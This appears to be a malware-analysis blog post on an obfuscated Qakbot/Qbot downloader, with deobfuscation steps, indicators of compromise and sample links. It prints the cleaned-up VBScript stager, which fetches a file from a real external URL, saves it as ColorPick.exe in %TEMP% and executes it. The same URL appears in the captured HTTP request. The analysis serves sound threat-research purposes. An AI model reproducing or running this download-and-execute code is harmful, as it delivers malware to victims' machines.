---
weight: 4
title: "Qakbot/Qbot Downloader"
date: 2020-02-12
draft: false
author: "c3rb3ru5d3d53c"
description: "Analysis of a Qakbot/Qbot Downlaoder"
images: []
tags: ["QakBot", "QBot", "Bot"]
categories: ["Malware"]
lightgallery: true
---

## Situation:

I came across an interesting obfuscated sample on `Any.Run`.

## Metadata:

- `db2614353dc6c29dbe323dbeafe6b781`

## Analysis:

The sample has a ton of comments making the file size total around `~4mb`.

This was easily parsed out with `sed 's/^\x27//'`.

The next step is to idenify where code is evaluated which was here `exECuTeglOBal sHLW(iDxY)`.

Changed this to `WScript.Echo` then also had to backtrack for a variable which defined before the evaluation.

This variable contained an array of strings which contain object names and the downloader URL, User-Agent etc.

I also had to comment out the part which causes it to sleep for `30` seconds.

Below is the script after everything has been put into a readable format.

```js
Wscript.Sleep 30000
on error resume next
set a = WScript.CreateObject("WScript.Shell")
set b = WScript.CreateObject("Scripting.FileSystemObject")
f = a.ExpandEnvironmentStrings("%TEMP%") & "\x.url"
set c = a.CreateShortcut(f)
c.TargetPath = "an"
c.Save
if b.FileExists(f) = false Then
	e = a.ExpandEnvironmentStrings("%TEMP%") & "\ColorPick.exe"
	Call u
	sub u
		set d = createobject("MSXML2.ServerXMLHTTP.6.0")
		set w = createobject("Adodb.Stream")
		d.Open "GET", "http://mostasharanetalim.ir/wp-content/uploads/2020/02/recent/444444.png", False
		d.setRequestHeader "User-Agent", "HanamiRuby"
		d.Send
		with w
			.type=1
			.open
			.write d.responseBody
			.savetofile e, 2
		end with
	end sub
	WScript.Sleep 60000
	a.Exec(e)
end if
```

### Network Traffic:
```http
GET /wp-content/uploads/2020/02/recent/444444.png HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Language: en-us
User-Agent: HanamiRuby
Host: mostasharanetalim.ir
```

The payload named ColorPick.exe `Qakbot/QBot` will be dropped to the `%TEMP%` folder.

## IOCS:

```http
db2614353dc6c29dbe323dbeafe6b781
hxxp://mostasharanetalim[.]ir/wp-content/uploads/2020/02/recent/444444[.]png
User-Agent: HanamiRuby
```

## References:
- [Samples](/samples/2020-02-12-qakbot-downloader.zip)
- [Any.Run](https://app.any.run/tasks/d93b5d16-b34d-4f9f-ae35-6e5feabfb4e3/)
- [VirusTotal](https://www.virustotal.com/gui/file/557daae4c867c0f543cdfda80a85dd4e4dfd268e11861739b0654cbf09c06b31/detection)
- [Twitter](https://twitter.com/c3rb3ru5d3d53c/status/1227767571547590657)
